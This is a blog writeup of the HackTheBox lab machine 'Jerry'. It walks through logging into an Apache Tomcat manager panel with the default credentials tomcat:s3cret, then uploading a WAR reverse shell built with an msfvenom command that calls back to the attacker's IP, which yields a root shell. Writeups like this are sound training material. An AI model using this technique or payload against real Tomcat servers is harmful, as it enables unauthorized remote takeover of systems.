---
layout: post
title: HackTheBox&#58; Jerry
description: Writeup for HTB box Jerry.
category: HackTheBox
---

### Introduction

Jerry is a Windows box, difficulty Easy on HTB.

The box is very easy.
There is an Apache Tomcat running as root.
We can get root shell directly by finding default credentials for manager panel then upload the jsp reverse shell.

### Initial Scan

![Jerry-1](/resources/Jerry-1.png)

### User and Root: Apache Tomcat

We see the only open port is port 8080 running Apache Tomcat (I guess that explains the name of the box).
Going to the page we see default landing page of Apache Tomcat version 7.0.88.

Checking Manager App button on the front page, we are presented with a login prompt.
Trying default credential such as admin:admin does not work and we are seeing a 403 Access Denied page.
![Jerry-2](/resources/Jerry-2.png)

Here we can see instructions for admin to add authorized accounts.
The default credential here is `tomcat:s3cret`.
Login again with this credential and we get access to Tomcat Web Application Manager.
![Jerry-3](/resources/Jerry-3.png)

We can see a section "WAR file to deploy", which allows us to upload file in `.war` format.
Basically the Tomcat is written in Java and can serve `.jsp` file.
`.war` is essentially zipped java file.

We can generate a reverse shell in `.war` format using `msfvenom`.
``` bash
msfvenom --payload java/shell_reverse_tcp lhost=10.10.14.25 lport=1337 --format war > shell.war
```

Then we just need to upload `shell.war` file and browse to 10.10.10.95:8000/shell to trigger the payload.
![Jerry-4](/resources/Jerry-4.png)

We get a root shell and can read both user.txt and root.txt.
